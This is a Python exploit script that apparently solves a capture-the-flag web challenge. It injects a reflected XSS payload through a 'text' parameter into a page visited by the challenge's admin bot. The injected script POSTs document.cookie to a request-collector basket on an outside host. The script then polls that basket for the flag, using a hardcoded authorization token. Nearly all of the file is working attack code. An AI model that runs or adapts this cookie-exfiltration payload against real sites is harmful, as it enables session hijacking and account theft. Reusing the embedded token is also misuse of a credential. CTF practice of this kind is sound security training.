#!/usr/bin/env -S python3 -u
# -*- coding: utf-8 -*-
# This exploit template was generated via:
import re
import os
import random
import json
import time
import requests

# Find flag by exact match or format
# log.success(find_flag(io.recvall()))
real_flag = open("./flag.txt", "r").readline().strip()
fake_flag = open("./flag-fake.txt", "r").readline().strip()
def find_flag(output):
    if not isinstance(output, str):
        output = output.decode(errors="ignore")
    # Match real flag
    if real_flag in output:
        return real_flag
    # Match fake flag
    if fake_flag in output:
        return fake_flag
    # Match possible local flag
    with open("/flag.txt", "r") as local:
        locl_flag = local.readline().strip()
        if locl_flag in output:
            return locl_flag
    # Match regexp flag
    r = find_flag_fmt(output)
    if r is not None:
        return r
    # Definitely no flag found
    return None

# Find flag by format
# log.success(find_flag_fmt(io.recvall()))
ffmt = re.compile(r"gctf{.*}")
def find_flag_fmt(output):
    if not isinstance(output, str):
        output = output.decode(errors="ignore")
    m = ffmt.search(output)
    if m is None:
        return None
    return m.group(0)

wait_between_requests = 5
timeout = 120 # seconds

protocol = os.environ.get("PROTOCOL", "http")
host = os.environ.get("HOST", "localhost")
port = int(os.environ.get("PORT", "1337"))

name = random.randint(1_000_000_000, 9_000_000_000)

request = "https://basket.losfuzzys.net"
token = "EfRTX97a^rtE@@qSD2*dZqoLn^RfXukaQacZgcCJvT6cKfP#G*unLAnTA9Dg#Fz@"

url = f"{protocol}://{host}:{port}"

def createBucket():
    print("[+] Create bucket", flush=True)
    res = requests.post(f"{request}/api/baskets/{name}", headers={
        "Authorization": f"{token}"
    })
    content = res.content.decode()
    json_content = json.loads(content)
    return json_content["token"]

def deleteBucket():
    print("[+] Delete bucket", flush=True)
    requests.delete(f"{request}/api/baskets/{name}", headers={
        "Authorization": f"{token}"
    })

def getRequests():
    res = requests.get(f"{request}/api/baskets/{name}/requests", headers={
        "Authorization": f"{token}"
    })
    content = res.content.decode()
    json_content = json.loads(content)
    return json_content["requests"]

createBucket()

instance = f"{request}/{name}"
payload = """<script>
fetch("%s", {
  method: "POST",
  body: JSON.stringify(document.cookie)
});
</script>
""" % instance

encoded = requests.utils.quote(payload)
exploit_url = f"/?text={encoded}"
res = requests.post(f"{url}/bot.php", data={
    "path": exploit_url
})

max_iterations = int(timeout/wait_between_requests)
for i in range(max_iterations):
    print(f"[+] Waiting for flag ({i+1}/{max_iterations})", flush=True)
    entries = getRequests()
    for entry in entries:
        body = entry["body"]
        flag = find_flag(body)
        if flag:
            print(f"\033[93m[+] Flag: {flag}\033[0m", flush=True)
            deleteBucket()
            exit(0)
    time.sleep(wait_between_requests)

print("[+] Flag could not be found", flush=True)
deleteBucket()
exit(255)
